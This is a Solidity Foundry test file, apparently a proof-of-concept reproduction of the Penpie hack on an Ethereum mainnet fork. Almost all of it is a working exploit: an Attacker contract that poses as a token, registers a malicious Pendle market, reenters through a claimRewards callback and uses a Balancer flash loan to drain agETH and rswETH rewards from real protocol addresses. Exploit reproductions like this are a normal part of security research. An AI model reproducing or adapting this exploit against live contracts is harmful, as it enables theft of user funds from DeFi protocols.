// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contrasts involved
address constant agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
address constant PENDLE_LPT_0x6010 = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
address constant PENDLE_LPT_0x038c = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
address constant PendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
address constant MasterPenpie = 0x16296859C15289731521F199F0a5f762dF6347d0;
address constant PendleYieldContractFactory = 0x35A338522a435D46f77Be32C70E215B813D0e3aC;
address constant PendleMarketFactoryV3 = 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050;
address constant PendleMarketRegisterHelper = 0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a;
address constant PendleMarketDepositHelper_0x1c1f = 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4;
address constant PendleStaking_0x6e79 = 0x6E799758CEE75DAe3d84e09D40dc416eCf713652;

contract Penpiexyz_io_exp is Test {
    Attacker attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", 20671878 - 1);
    }
    
    function testPoC_A() public {
        attacker = new Attacker();

        // First tx: 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1
        attacker.createMarket();
        
        // To pass `if (lastRewardBlock != block.number) {` of PendleMarketV3 contract
        vm.roll(block.number + 1);
        
        // Second tx: 0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5
        attacker.attack();

        console.log('Final balance in agETH :', IERC20(agETH).balanceOf(address(attacker)));
        console.log('Final balance in rswETH:', IERC20(rswETH).balanceOf(address(attacker)));
    }
}

// Minimum contract just to make the hack work
abstract contract ERC20 {
    string public name = '';
    string public symbol = '';
    uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[to] += amount;
    }

    function _mint(address to, uint256 amount) internal virtual {
        balanceOf[to] += amount;
    }
}

contract Attacker is ERC20 {
    address PENDLE_LPT; // Equal to PENDLE_LPT_0x5b6c = 0x5b6c23aedf704D19d6D8e921E638e8AE03cDCa82; of the original hack transaction
    
    uint256 saved_bal;
    uint256 saved_bal1;
    uint256 saved_bal2;
    uint256 saved_value;

    function assetInfo() external view returns(uint8, address, uint8) {
        return (0, address(this), 8);
    }

    function exchangeRate() external view returns (uint256 res) {
        return 1 ether;
    }
    function getRewardTokens() external view returns (address[] memory) {
        if (PENDLE_LPT == msg.sender) {
            address[] memory tokens = new address[](2);
            tokens[0] = PENDLE_LPT_0x6010;
            tokens[1] = PENDLE_LPT_0x038c;
            return tokens;
        }
    }
    function rewardIndexesCurrent() external returns (uint256[] memory) { }

    uint256 claimRewardsCall;
    function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {
        if (claimRewardsCall == 0) {
            claimRewardsCall++;
            return new uint256[](0);
        }

        if (claimRewardsCall == 1) {
            IERC20(agETH).approve(PendleRouterV4, type(uint256).max);
            uint256 bal_agETH = IERC20(agETH).balanceOf(address(this));

            {
                Interfaces.SwapData memory swapData = Interfaces.SwapData(
                    Interfaces.SwapType.NONE,// SwapType swapType;
                    address(0),// address extRouter;
                    "",// bytes extCalldata;
                    false// bool needScale;
                );
                Interfaces.TokenInput memory input = Interfaces.TokenInput(
                    agETH,// address tokenIn;
                    bal_agETH,// uint256 netTokenIn;
                    agETH,// address tokenMintSy;
                    address(0),// address pendleSwap;
                    swapData
                );
                Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(
                    address(this), // address receiver,
                    PENDLE_LPT_0x6010, // address market,
                    1, // uint256 minLpOut,
                    1, // uint256 minYtOut,
                    input // TokenInput calldata input
                );
            }

            saved_bal = IERC20(PENDLE_LPT_0x6010).balanceOf(address(this));
            IERC20(PENDLE_LPT_0x6010).approve(PendleStaking_0x6e79, saved_bal);
            Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x6010, saved_bal);
            IERC20(rswETH).approve(PendleRouterV4, type(uint256).max);
            uint256 bal_rswETH = IERC20(rswETH).balanceOf(address(this));

            {
                Interfaces.SwapData memory swapData = Interfaces.SwapData(
                    Interfaces.SwapType.NONE,// SwapType swapType;
                    address(0),// address extRouter;
                    "",// bytes extCalldata;
                    false// bool needScale;
                );
                Interfaces.TokenInput memory input = Interfaces.TokenInput(
                    rswETH,// address tokenIn;
                    bal_rswETH,// uint256 netTokenIn;
                    rswETH,// address tokenMintSy;
                    address(0),// address pendleSwap;
                    swapData
                );
                (saved_value,,,) = Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(
                    address(this), // address receiver,
                    PENDLE_LPT_0x038c, // address market,
                    1, // uint256 minLpOut,
                    1, // uint256 minYtOut,
                    input // TokenInput calldata input
                );
            }

            uint256 bal_PENDLE_LPT_0x038c_this = IERC20(PENDLE_LPT_0x038c).balanceOf(address(this));
            IERC20(PENDLE_LPT_0x038c).approve(PendleStaking_0x6e79, bal_PENDLE_LPT_0x038c_this);

            Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x038c, bal_PENDLE_LPT_0x038c_this);
        }
    }

    function createMarket() external {
        (address PT, address YT) =
            Interfaces(PendleYieldContractFactory).createYieldContract(
                address(this),
                1735171200,
                true
            );
        PENDLE_LPT = Interfaces(PendleMarketFactoryV3).createNewMarket(
            PT,
            23352202321000000000,
            1032480618000000000,
            1998002662000000
        );
        Interfaces(PendleMarketRegisterHelper).registerPenpiePool(PENDLE_LPT);
        
        _mint(address(YT), 1 ether);
        
        Interfaces(YT).mintPY(address(this), address(this));

        uint256 bal = IERC20(PT).balanceOf(address(this));

        IERC20(PT).transfer(PENDLE_LPT, bal);

        _mint(address(PENDLE_LPT), 1 ether);

        Interfaces(PENDLE_LPT).mint(
            address(this),
            1 ether,
            1 ether
        );

        IERC20(PENDLE_LPT).approve(PendleStaking_0x6e79, type(uint256).max);

        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT, 999999999999999000);
    }

    // Second

    function attack() external {
        address[] memory tokens = new address[](2);
        tokens[0] = agETH;
        tokens[1] = rswETH;
        uint256[] memory amounts = new uint256[](2);
        saved_bal1 = IERC20(agETH).balanceOf(balancerVault);
        amounts[0] = saved_bal1;
        saved_bal2 = IERC20(rswETH).balanceOf(balancerVault);
        amounts[1] = saved_bal2;
        Interfaces(balancerVault).flashLoan(
            address(this),
            tokens,
            amounts,
            ''
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        address[] memory _markets = new address[](1);
        _markets[0] = PENDLE_LPT;
        Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(
            _markets,
            0
        );

        Interfaces(MasterPenpie).multiclaim(_markets);
        Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x6010, saved_bal);
        uint256 bal_this = IERC20(PENDLE_LPT_0x6010).balanceOf(address(this));

        IERC20(PENDLE_LPT_0x6010).approve(PendleRouterV4, bal_this);

        {
            Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(
                address(0),// address limitRouter;
                0,// uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
                new Interfaces.FillOrderParams[](0),// FillOrderParams[] normalFills;
                new Interfaces.FillOrderParams[](0),// FillOrderParams[] flashFills;
                ''// bytes optData;
            );

            Interfaces.SwapData memory swapData = Interfaces.SwapData(
                Interfaces.SwapType.NONE,// SwapType swapType;
                address(0),// address extRouter;
                "",// bytes extCalldata;
                false// bool needScale;
            );

            Interfaces.TokenOutput memory output = Interfaces.TokenOutput(
                agETH,//address tokenOut;
                0,//uint256 minTokenOut;
                agETH,//address tokenRedeemSy;
                address(0),//address pendleSwap;
                swapData//SwapData swapData;
            );

            Interfaces(PendleRouterV4).removeLiquiditySingleToken(
                address(this),//address receiver,
                PENDLE_LPT_0x6010,//address market,
                bal_this,//uint256 netLpToRemove,
                output,//TokenOutput calldata output,
                limit//LimitOrderData calldata limit
            );
        }

        Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x038c, saved_value);

        uint256 bal_PENDLE_LPT_0x038c = IERC20(PENDLE_LPT_0x038c).balanceOf(address(this));
        IERC20(PENDLE_LPT_0x038c).approve(PendleRouterV4, bal_PENDLE_LPT_0x038c);
            
        {
            Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(
                address(0),// address limitRouter;
                0,// uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
                new Interfaces.FillOrderParams[](0),// FillOrderParams[] normalFills;
                new Interfaces.FillOrderParams[](0),// FillOrderParams[] flashFills;
                ''// bytes optData;
            );

            Interfaces.SwapData memory swapData = Interfaces.SwapData(
                Interfaces.SwapType.NONE,// SwapType swapType;
                address(0),// address extRouter;
                "",// bytes extCalldata;
                false// bool needScale;
            );

            Interfaces.TokenOutput memory output = Interfaces.TokenOutput(
                rswETH,//address tokenOut;
                0,//uint256 minTokenOut;
                rswETH,//address tokenRedeemSy;
                address(0),//address pendleSwap;
                swapData//SwapData swapData;
            );

            Interfaces(PendleRouterV4).removeLiquiditySingleToken(
                address(this),//address receiver,
                PENDLE_LPT_0x038c,//address market,
                bal_PENDLE_LPT_0x038c,//uint256 netLpToRemove,
                output,//TokenOutput calldata output,
                limit//LimitOrderData calldata limit
            );
        }

        IERC20(agETH).balanceOf(address(this));
        IERC20(agETH).transfer(balancerVault, saved_bal1);
        IERC20(rswETH).balanceOf(address(this));
        IERC20(rswETH).transfer(balancerVault, saved_bal2);
    }
}

interface Interfaces {
    // PendleYieldContractFactory
    function createYieldContract(
        address SY,
        uint32 expiry,
        bool doCacheIndexSameBlock
    ) external returns (address PT, address YT);

    // PendleMarketFactoryV3
    function createNewMarket(
        address PT,
        int256 scalarRoot,
        int256 initialAnchor,
        uint80 lnFeeRateRoot
    ) external returns (address market);

    // PendleMarketRegisterHelper
    function registerPenpiePool(address _market) external;

    // PendleYieldToken
    function mintPY(
        address receiverPT,
        address receiverYT
    ) external returns (uint256 amountPYOut);

    // PendleMarketV3
    function mint(
        address receiver,
        uint256 netSyDesired,
        uint256 netPtDesired
    ) external returns (uint256 netLpOut, uint256 netSyUsed, uint256 netPtUsed);
    
    function redeemRewards(address user) external returns (uint256[] memory);

    // PendleMarketDepositHelper_0x1c1f
    function depositMarket(address _market, uint256 _amount) external;
    function withdrawMarket(address _market, uint256 _amount) external;

    // balancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // PendleStaking_0x6e79
    struct Pool {
        address market;
        address rewarder;
        address helper;
        address receiptToken;
        uint256 lastHarvestTime;
        bool isActive;
    }

    function pools(address) external view returns(Pool memory);

    function batchHarvestMarketRewards(
        address[] calldata _markets,
        uint256 minEthToRecieve
    ) external;

    function harvestMarketReward(
        address _market,
        address _caller,
        uint256 _minEthRecive
    ) external;

    // PendleRouterV4
    enum SwapType {
        NONE,
        KYBERSWAP,
        ONE_INCH,
        ETH_WETH
    }

    struct SwapData {
        SwapType swapType;
        address extRouter;
        bytes extCalldata;
        bool needScale;
    }

    struct TokenInput {
        address tokenIn;
        uint256 netTokenIn;
        address tokenMintSy;
        address pendleSwap;
        SwapData swapData;
    }

    function addLiquiditySingleTokenKeepYt(
        address receiver,
        address market,
        uint256 minLpOut,
        uint256 minYtOut,
        TokenInput calldata input
    ) external payable returns (uint256 netLpOut, uint256 netYtOut, uint256 netSyMintPy, uint256 netSyInterm);
    
    enum OrderType {
        SY_FOR_PT,
        PT_FOR_SY,
        SY_FOR_YT,
        YT_FOR_SY
    }

    struct Order {
        uint256 salt;
        uint256 expiry;
        uint256 nonce;
        OrderType orderType;
        address token;
        address YT;
        address maker;
        address receiver;
        uint256 makingAmount;
        uint256 lnImpliedRate;
        uint256 failSafeRate;
        bytes permit;
    }

    struct FillOrderParams {
        Order order;
        bytes signature;
        uint256 makingAmount;
    }

    struct LimitOrderData {
        address limitRouter;
        uint256 epsSkipMarket;
        FillOrderParams[] normalFills;
        FillOrderParams[] flashFills;
        bytes optData;
    }
    struct TokenOutput {
        address tokenOut;
        uint256 minTokenOut;
        address tokenRedeemSy;
        address pendleSwap;
        SwapData swapData;
    }

    function removeLiquiditySingleToken(
        address receiver,
        address market,
        uint256 netLpToRemove,
        TokenOutput calldata output,
        LimitOrderData calldata limit
    ) external returns (uint256 netTokenOut, uint256 netSyFee, uint256 netSyInterm);

    // MasterPenpie
    function multiclaim(
        address[] calldata _stakingTokens
    ) external;
}